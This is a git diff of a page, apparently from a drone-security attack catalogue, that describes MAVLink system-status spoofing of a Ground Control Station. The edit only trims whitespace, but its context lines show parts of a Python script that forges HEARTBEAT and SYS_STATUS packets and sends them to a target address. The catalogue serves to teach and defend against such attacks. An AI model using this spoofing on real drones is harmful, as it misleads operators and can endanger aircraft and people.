@@ -10,8 +10,8 @@ breadcrumb:
 sections:
   - title: Description
     content: |
-      System Status spoofing involves sending false system status data to the Ground 
-      Control Station (GCS) to mislead it about the drone's actual system health. This 
+      System Status spoofing involves sending false system status data to the Ground
+      Control Station (GCS) to mislead it about the drone's actual system health. This
       can cause the operator to make incorrect decisions based on the spoofed data.
 
   - title: Resources
@@ -55,7 +55,7 @@ sections:
                   custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
                   system_status=mavutil.mavlink.MAV_STATE_ACTIVE
               )
-              
+
               return heartbeat.pack(mav)
 
           def create_sys_status():
@@ -106,7 +106,7 @@ sections:
 
                   send_mavlink_packet(heartbeat_packet, target_ip, target_port)
                   send_mavlink_packet(sys_status_packet, target_ip, target_port)
-                  
+
                   print(f"Sent heartbeat and SYS_STATUS packets to {target_ip}:{target_port}")
 
           ```
